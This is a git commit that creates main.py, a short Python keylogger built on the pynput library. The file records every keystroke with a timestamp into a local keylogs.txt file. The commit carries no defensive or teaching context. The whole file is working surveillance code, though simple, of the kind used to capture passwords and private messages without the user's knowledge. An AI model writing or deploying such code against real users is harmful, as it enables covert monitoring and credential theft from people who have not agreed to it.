a936a40e1e152ffe148fa816ff1dfcab0508ded8
Kavindu Chamodh Nethsara <72559423+ChamodhNethsara@users.noreply.github.com>
2021-03-14 19:24:46 +0530

    Create main.py

---
+++ main.py
@@ -0,0 +1,13 @@
+
+import logging
+
+from pynput.keyboard import Key, Listener
+
+log_dir = ''
+logging.basicConfig(filename=(log_dir + "keylogs.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s',)
+
+def on_press(key):
+    logging.info(str(key))
+
+with Listener(on_press=on_press) as listner:
+    listner.join()
